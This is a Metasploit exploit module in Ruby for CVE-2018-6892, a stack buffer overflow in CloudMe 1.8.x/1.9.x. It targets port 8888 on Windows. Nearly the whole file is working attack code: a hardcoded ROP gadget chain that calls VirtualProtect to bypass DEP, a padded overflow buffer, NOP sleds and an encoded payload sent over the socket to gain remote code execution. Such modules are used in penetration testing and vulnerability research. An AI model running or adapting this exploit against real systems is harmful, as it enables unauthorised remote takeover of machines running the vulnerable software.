# Exploit Title: Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)
# Date: 2018-08-13
# Exploit Author: Raymond Wellnitz
# Vendor Homepage: https://www.cloudme.com
# Version: 1.8.x/1.9.x
# Tested on: Windows 7 x64
# CVE : 2018-6892

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Cloudme v1.8.x/v1.9.x Buffer Overflow with DEP-Bypass',
      'Description'    => %q{
          This module exploits a stack buffer overflow in Cloudme v1.8.x/v1.9.x.
      },
      'Author'         => [ 'Raymond Wellnitz' ],
      'References'     =>
        [
          [ 'CVE', 'CVE-2018-6892' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Platform'       => 'win',
      'Privileged'     => true,
      'Payload'        =>
        {
          'Space'    => 600,
          'BadChars' => "\x00"
        },
      'Targets'        =>
        [
          [ 'Windows x86_32/64',   		{ 'Ret' => 0x6cfa88a2  } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '11.02.2018'))

    register_options([ Opt::RPORT(8888) ])
  end

def create_rop_chain()
    rop_gadgets = [
      0x6cf98182,  # POP EAX # RETN [icuin49.dll]
      0x68c848d8,  # ptr to &VirtualProtect() [IAT Qt5Core.dll]
      0x61b4d226,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [Qt5Gui.dll]
      0x668d8261,  # XCHG EAX,ESI # RETN [libGLESv2.dll]
      0x68a5c297,  # POP EBP # RETN [Qt5Core.dll]
      0x688dd45d,  # & JMP ESP [Qt5Core.dll]
      0x68abe868,  # POP EAX # RETN [Qt5Core.dll]
      0xfffffdff,  # 201
      0x1004b263,  # NEG EAX # RETN [LIBEAY32.dll]
      0x689687d2,  # XCHG EAX,EBX # RETN
      0x68abe868,  # POP EAX # RETN [Qt5Core.dll]
      0xffffffc0,  # 40
      0x1004b263,  # NEG EAX # RETN [LIBEAY32.dll]
      0x6751d479,  # XCHG EAX,EDX # RETN [icuuc49.dll]
      0x100010c7,  # POP ECX # RETN [LIBEAY32.dll]
      0x6494ea0a,  # &Writable location [libwinpthread-1.dll]
      0x68a49534,  # POP EDI # RETN [Qt5Core.dll]
      0x1008df82,  # RETN (ROP NOP) [LIBEAY32.dll]
      0x68ad025b,  # POP EAX # RETN [Qt5Core.dll]
      0x90909090,  # NOPS
      0x6759bdb4,  # PUSHAD # RETN [icuuc49.dll]
    ].flatten.pack("V*")
    return rop_gadgets
end

  def exploit
    connect

    sploit = rand_text_alpha_upper(1036)
    sploit << create_rop_chain()
    sploit << make_nops(30)
    sploit << payload.encoded

    print_status("Trying target #{target.name}...")
    sock.put(sploit + "\r\n\r\n")

    handler
    disconnect
  end
end